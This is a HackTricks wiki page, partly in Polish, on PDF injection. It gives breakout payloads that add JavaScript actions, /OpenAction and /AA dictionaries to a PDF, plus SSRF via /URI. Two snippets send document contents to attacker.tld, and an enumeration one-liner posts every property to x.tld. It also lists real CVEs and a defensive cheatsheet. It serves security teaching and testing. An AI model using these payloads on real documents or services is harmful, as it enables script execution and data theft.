# PDF Injection

{{#include ../../banners/hacktricks-training.md}}

**Jeśli Twoje dane wejściowe są odzwierciedlane wewnątrz pliku PDF, możesz spróbować wstrzyknąć dane PDF, aby uruchomić JavaScript, przeprowadzić SSRF lub ukraść zawartość PDF.**
PDF syntax is extremely permissive – if you can break out of the string or dictionary that is embedding your input you can append totally new objects (or new keys in the same object) that Acrobat/Chrome will happily parse.
Since 2024 a wave of bug-bounty reports have shown that *one unescaped parenthesis or back-slash is enough* for full script execution.

## TL;DR – Nowoczesny przebieg ataku (2024-2026)
1. Znajdź dowolną wartość kontrolowaną przez użytkownika, która trafia do środka **(parenthesis string)**, pola `/URI ( … )` lub `/JS ( … )` w wygenerowanym PDF.
2. Wstrzyknij `) ` (zamykając string) po którym umieść jeden z poniższych prymitywów i zakończ kolejnym otwierającym nawiasem, aby zachować poprawność składni.
3. Dostarcz złośliwy PDF ofierze (lub do backend service, który automatycznie renderuje plik – świetne dla blind bugs).
4. Your payload runs in the PDF viewer:
* Chrome / Edge → PDFium Sandbox
* Firefox → PDF.js (see CVE-2024-4367)
* Acrobat → Full JavaScript API (can exfiltrate arbitrary file contents with `this.getPageNthWord`)

Example (annotation link hijack):
```pdf
(https://victim.internal/) ) /A << /S /JavaScript /JS (app.alert("PDF pwned")) >> /Next (
```
*Pierwsze `)` zamyka oryginalny ciąg URI, następnie dodajemy nowy słownik **Action**, który Acrobat wykona, gdy użytkownik kliknie link.*

## Przydatne Injection Primitives
| Goal | Payload Snippet | Notes |
|------|-----------------|-------|
| **JavaScript podczas otwarcia** | `/OpenAction << /S /JavaScript /JS (app.alert(1)) >>` | Wykonuje się natychmiast po otwarciu dokumentu (działa w Acrobat, nie w Chrome). |
| **JavaScript na linku** | `/A << /S /JavaScript /JS (fetch('https://attacker.tld/?c='+this.getPageNumWords(0))) >>` | Działa w PDFium & Acrobat, jeśli kontrolujesz adnotację `/Link`. |
| **Blind data exfiltration** | `<< /Type /Action /S /URI /URI (https://attacker.tld/?leak=)` | Połącz z `this.getPageNthWord` w JS, aby wykraść zawartość. |
| **Server-Side SSRF** | Same as above but target an internal URL – great when the PDF is rendered by back-office services that honour `/URI`. |
| **Dodatkowe akcje (/AA)** | `/AA << /O << /S /JavaScript /JS (app.alert(1)) >> >>` | Dołącz do słownika Page/Annotation/Form, aby uruchamiać przy otwarciu lub otrzymaniu fokusu. |
| **Nowa linia dla nowych obiektów** | `\nendobj\n10 0 obj\n<< /S /JavaScript /JS (app.alert(1)) >>\nendobj` | Jeśli biblioteka pozwala wstrzykiwać znaki nowej linii, możesz utworzyć zupełnie nowe obiekty. |

## Embedded Actions as Injection Targets
PDF viewers treat **embedded actions** such as `/OpenAction` and `/AA` (Additional Actions) as first-class features that can run when a document opens or when a specific event fires. If you can inject into any dictionary that accepts actions (Catalog, Page, Annotation, or Form field), you can graft an `/AA` tree and trigger JavaScript on open/focus.

Przykładowy payload dla **generator-side object injection** (zamknij oryginalny string/dictionary i wstrzyknij `/AA`):
```pdf
) >> /AA << /O << /S /JavaScript /JS (app.alert('AA fired')) >> >> (
```
Ten wzorzec pasuje do niedawnych problemów jsPDF, w których dane kontrolowane przez atakującego przekazane do `addJS` (lub niektórych pól AcroForm) wychodzą poza zamierzony ciąg JavaScript i wstrzykują słownik **Additional Action**.

## Blind Enumeration Trick
Gareth Heyes (PortSwigger) opublikował jednolinijkowy skrypt, który enumeruje każdy obiekt w nieznanym dokumencie — przydatne, gdy nie możesz zobaczyć wygenerowanego PDF:
```pdf
) /JS (for(i in this){try{this.submitForm('https://x.tld?'+i+'='+this[i])}catch(e){}}) /S /JavaScript /A << >> (
```
The code iterates over the Acrobat DOM and makes outbound requests for every property/value pair, giving you a *JSON-ish* dump of the file.
See the white-paper “Portable Data **ex**Filtration” for the full technique.

## Real-World Bugs (2023-2026)
* **CVE-2026-25755** – jsPDF `addJS` PDF object injection: kontrolowane przez atakującego ciągi mogą zamknąć literal JS i wstrzyknąć `/AA` → `/O` → `/JavaScript` akcje, które uruchamiają się przy otwarciu/fokusie.
* **CVE-2024-4367** – Dowolne wykonanie JavaScriptu w PDF.js w Firefoxie (wersje przed 4.2.67) omijało sandbox przy użyciu spreparowanej akcji `/JavaScript`.
* **Bug bounty 2024-05** – Duży fintech zezwolił na notatki do faktur dostarczone przez klientów, które trafiły do `/URI`; raport nagrodzono $10k po udokumentowaniu SSRF do wewnętrznego hosta metadata używając `file:///` URI.
* **CVE-2023-26155** – `node-qpdf` command-injection poprzez niesanitizowaną ścieżkę PDF pokazuje, jak ważne jest escapowanie backslashy i nawiasów nawet *przed* warstwą PDF.

## Defensive Cheatsheet
1. **Nigdy nie łącz surowego wejścia użytkownika** wewnątrz `(`…`)` stringów lub nazw. Escapuj `\`, `(`, `)` zgodnie z §7.3 specyfikacji PDF lub użyj hex stringów `<...>`.
2. Jeśli tworzysz linki, preferuj `/URI (https://…)`, które *w pełni* zakodujesz URL-owo; blokuj schematy `javascript:` w client viewers.
3. Usuń lub zweryfikuj słowniki `/OpenAction`, `/AA` (additional actions), `/Launch`, `/SubmitForm` i `/ImportData` podczas post-processingu PDF-ów.
4. Po stronie serwera renderuj nieufne PDFy przy użyciu *headless converter* (np. qpdf –decrypt –linearize), który usuwa JavaScript i akcje zewnętrzne.
5. Utrzymuj PDF viewers zaktualizowane; PDF.js < 4.2.67 i Acrobat Reader przed poprawkami z lipca 2024 pozwalają na trywialne wykonanie kodu.
6. Jeśli używasz generatorów po stronie klienta (np. jsPDF), nigdy nie przekazuj nieufnych danych do `addJS` ani setterów AcroForm, które trafiają do słowników akcji PDF.

## References
* Gareth Heyes, “Portable Data exFiltration – XSS for PDFs”, PortSwigger Research (updated May 2024). <https://portswigger.net/research/portable-data-exfiltration>
* Dawid Ryłko, “CVE-2024-4367: Arbitrary JavaScript Execution in PDF.js” (Apr 2024). <https://dawid.dev/sec/cve-2024-4367-arbitrary-javascript-execution-in-pdf-js>
* GitLab Advisory Database, “CVE-2026-25755: jsPDF has a PDF Object Injection via Unsanitized Input in addJS Method” (Feb 2026). <https://advisories.gitlab.com/pkg/npm/jspdf/CVE-2026-25755/>
* Adobe Acrobat Help, “Acrobat shows a warning message when signing documents” (Sep 2025) – akcje osadzone takie jak OpenAction/AA. <https://helpx.adobe.com/acrobat/kb/embedded-action-signing-warning.html>
{{#include ../../banners/hacktricks-training.md}}
